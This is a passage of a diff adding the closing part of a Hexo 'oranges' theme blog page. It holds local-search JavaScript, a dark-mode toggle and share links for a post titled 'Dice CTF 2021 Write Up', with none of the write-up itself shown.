+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>No result<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The search.xml file was not found, please refer to：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The request failed, Try to refresh the page or try again later.<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + Dice%20CTF%202021%20Write%20Up + '&url=' + https%3A%2F%2Fblog.pocas.kr%2F2021%2F02%2F08%2F2021-02-08-Dice-CTF%2F + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=https://blog.pocas.kr/2021/02/08/2021-02-08-Dice-CTF/" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
+  
+  
+<script src="/js/shares.js"></script>
+
+
+
+      </div>
+    </div>
+  </body>
+</html>
